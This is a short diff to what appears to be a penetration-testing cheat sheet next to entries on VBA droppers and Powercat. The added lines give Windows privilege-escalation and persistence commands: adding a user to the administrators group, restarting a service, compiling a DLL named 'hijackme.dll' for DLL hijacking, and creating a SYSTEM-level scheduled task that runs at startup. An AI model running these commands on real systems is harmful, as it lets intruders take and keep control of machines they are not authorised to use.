@@ -31,3 +31,19 @@ Stealthy Operations:
 
 VBA PowerShell Dropper
 VBA Powercat
+
+adding user to administrator group:
+    
+    cmd.exe /k net localgroup administrators user /add
+
+restarting service:
+    
+    sc stop dllsvc & sc start dllsvc
+
+command for compile on kali linux:
+
+    x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
+
+create scheduled task with cmd
+    
+    schtasks /create /tn "SecurityStartup" /tr "C:\pathtoprogram.exe" /sc ONSTART /ru SYSTEM /rl HIGHEST /f
